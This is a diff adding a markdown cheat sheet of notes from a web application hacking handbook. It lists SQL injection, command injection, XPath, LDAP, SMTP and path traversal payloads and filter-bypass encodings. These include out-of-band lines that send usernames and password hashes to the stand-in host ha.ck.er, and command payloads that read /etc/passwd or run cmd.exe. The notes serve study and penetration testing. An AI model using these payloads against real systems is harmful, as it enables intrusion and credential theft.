@@ -1,0 +1,210 @@
+# webapp hacker's handbook
+
+# SQL injection
+
+* fingerprint db
+MySQL: 'serv' 'ices'
+MS-SQL: 'serv'+'ices'
+Oracle: 'serv'||'ices'
+Postgres: 'serv'||'ices'
+
+Oracle: BITAND(1,1)-BITAND(1,1)
+MS-SQL: @@PACK_RECEIVED-@@PACK-RECEIVED
+MySQL: CONNECTION_ID()-CONNECTION_ID()
+MySQL: /*!32302 and 1=0*/ # will cause the select stmt to be false if the version in use is greater than or equal to 3.23.02
+
+* Oracle
+select object_name,object_type from user_objects
+select column_name from user_tab_columns where table_name='USERS'
+
+* MS-SQL
+' union select name,null from sysobjects where xtype = 'U'
+' union select b.name,null from sysobjects a,syscolumns b where a.id=b.id and a.name='users'--
+
+* determine number of columns and their data type in a select
+' order by 1--
+' order by 2--
+or
+' union select null,null-- # but note the additional row of data containing the word NULL or an empty string
+
+' union select 'a',null,null
+' union select null,'a',null
+
+* enumerating table and column names (MS-SQL)
+' having 1=1-- # error says column 'users.ID' is invalid in the select list because it is not contained in an aggregate function and there is no GROUP BY clause
+' group by users.ID having 1=1-- # error says column 'users.username' ...
+' group by users.ID, users.username having 1=1-- # does not result in any error msg
+next step is to determine data types of each column
+' union select sum(username) from users-- # The sum cannot take a varchar data type as an argumenet
+' union select sum(ID) from users-- # must have an equal number of expressions... so ID in a numeric data type
+you then do
+'; insert into users values( 666, 'attacker')--
+
+
+' or 1 in (select @@version)--
+Other ways of causing the db to attempt to convert a string value to a numeric data type:
+1+@@version
+SELECT CAST(@@version AS int)
+
+' or 1 in (select min(username) from users where username > 'a')-- # returns "aaron"
+' or 1 in (select min(username) from users where username > 'aaron')--
+
+* bypassing filters
+SeLeCt
+SELSELECTECT
+%53%45%4c%45%43%54
+%2553%2545%254c%2545%2543%2554
+SELECT/*foo*/username,password/*foo*/FROM/*foo*/users
+MySQL: SEL/*foo*/ECT username,password FR/*foo*/OM users
+
+Oracle: 'adm'||'in'
+MS-SQL: 'adm'+'in'
+MySQL: concat('adm','in')
+
+exec('sel' + 'ect * fro' + 'm users')
+
+* filter doubles up single quotes
+the payload "admin'--" will not work
+SELECT * FROM users WHERE username = 'admin''--' and password = '' -> user == "admin'--" 
+but filter truncates input to 20 chars
+payload login: aaaaaaaaaaaaaaaaaaa' 
+payload passw: [space]or 1=1--
+SELECT * FROM users WHERE username = 'aaaaaaaaaaaaaaaaaaa'' and passsword = ' or 1=1--' -> user == "aaaaaaaaaaaaaaaaaaa' and password = "
+
+to test for this: 
+''''''''''''''''''''''''''''''''''''''''''''' ... # even number
+a'''''''''''''''''''''''''''''''''''''''''''' ... # odd number
+
+* Second-Order
+INSERT INTO users (username, password, ID, privs) VALUES ('foo''', ... -> inserts "foo'" in db
+
+SELECT password FRO? users WHERE username = 'foo'' -> unclosed quotation mark before 'foo
+
+payload: ' or 1 in (select password from users where username ='admin')--
+will show the admin's password in error msg
+
+* Out-of-Band exfiltration
+MS-SQL: OpenRowSet
+insert into openrowset('SQLOLEDB','DRIVER=(SQL Server);SERVER=ha.ck.er:80;UID=sa;PWD=letmein','select * from foo') values (@@version)
+
+Oracle
+UTL_HTTP supports proxy servers, cookies, redirects, and authentication
+'||UTL_HTTP.request('ha.ck.er:80/'||(select username from all_users where rownum=1))--
+
+UTL_INADDR
+UTL_INADDR.GET_HOST_NAME((select password from dba_users where username='SYS')||'ha.ck.er')
+
+UTL_SMTP, UTL_TCP, UTL_FILE (read/write files) ...
+
+MySQL
+select * into outfile '\\\\ha.ck.er\share\output.txt' from users;
+
+* Conditional errors
+select 1/0 from dual where (select username from all_users where username = 'DBSNMP') = 'DBSNMP' # if user exists, this causes an error
+
+* Time-based
+MS-SQL
+'; waitfor delay '0:30:0'--
+; waitfor delay '0:30:0'--
+' waitfor delay '0:30:0'--
+
+* Privesc
+MS-SQL
+master..xp_cmdshell 'ipconfig > foo.txt' # can create out-of-band connections, uploading backdoor ...
+xp_regread / xp_regwrite
+
+select * from OpenRowSet('SQLOLEDB', 'uid=sa,pwd=foobar;Network=DBMSSOCN;Address=192.168.9.1,80;timeout=5','')
+ - port scan
+ - bruteforce creds of other databases
+ - connect back to local host and attempt to guess the password of the sa account
+ 
+MySQL
+FILE_PRIV
+stores data in plaintext files
+UDF (https://github.com/hatRiot/sql3_udf)
+
+# OS command injection
+node=a|cat /etc/passwd
+view=last5.log && dir c:\
+
+|| ping -c 30 127.0.0.1; x || ping -n 30 137.0.0.1 &
+| ping -c 30 127.0.0.1 |
+| ping -n 30 127.0.0.1 |
+& ping -c 30 127.0.0.1 &
+& ping -n 30 127.0.0.1 &
+; ping 127.0.0.1 ;
+%0a ping -c 30 127.0.0.1 %0a
+`ping 127.0.0.1`
+
+php:
+eval("$_GET['vuln']");
+?vuln=\$foo%3Dbar;%20echo%20file_get_contents('/etc/passwd')
+
+asp:
+Execute(Request("vuln"))
+?vuln=foo%3Dbar:response.write%2031337
+?vuln=foo%3Dbar:+Dim+oScript:+Set+oScript+=+Server.CreateObject("WSCRIPT.SHELL"):+Call+oScript.Run+("cmd.exe+/c+dir+>+c:\inetpub\wwwroot\dir.txt",0,True)
+
+# XML injection
+john</foo>
+john</foo><foo>
+and see if app returns error, and how app retuns your input
+
+# XPath injection (tool: https://github.com/feakk/xxxpwn, https://github.com/orf/xcat)
+informed
+' or 1=1 and 'a'='a
+' or 1=2 and 'a'='a
+
+blind
+extract the name of the current node's parent
+' or substring(name(parent::*[position()=1]),1,1)='a
+' or substring(name(parent::*[position()=1]),1,1)='b # false condition
+then cycle through each of its child nodes, extracting all of their na,es and values
+//address[position()=3]/child::node()[position()=4]/text() # node username
+//address[position()=3]/child::node()[position()=6]/text() # node password
+
+' or substring(//address[position()=3]/child::node()[position()=6]/text(),1,1)='P' and 'a'='a
+
+By cycling through every node, you can extract the entire contents of the XML
+
+detect
+' or 'a'='a
+' and 'a'='b
+ or 1=1
+ and 1=2
+(your tests for SQLi will reveal it)
+' or count(parent::*[position()=1])=0 or 'a'='b
+' or count(parent::*[position()=1])>0 or 'a'='b
+or
+1 or count(parent::*[position()=1])=0
+1 or count(parent::*[position()=1])>0
+ 
+# SMTP
+%0aCc:
+%0d%0aBcc:
+%0aDATA%0afoo%0a%2e%0aMAIL+FROM:...
+
+# LDAP
+detect
+)))))
+*);cn;
+*));cn;
+*)));cn;
+...
+
+john);mail,cn,l,st,c
+
+# Path traversal
+bypassing filters:
+
+           URL-encoding | 16-bit unicode-encoding | double URL-encoding | overlong UTF-8 unicode-encoding
+dot            %2e      | %u002e                  | %252e               | %c0%2e  %e0%40%ae  %c0ae  etc.
+forward slash  %2f      | %u2215                  | %252f               | %c0%af  %e0%80%af  %c0%2f etc.
+backslash      %5c      | %u2216                  | %255c               | %c0%5c  %c0%80%5c  etc.
+
+null byte      %00                                                      | %c0%80 
+
+hex(0x80 + ord('/')) -> %c0%af
+
+# scanners don't work
+Vulnerabilities Detected by Scanners (p649-...)
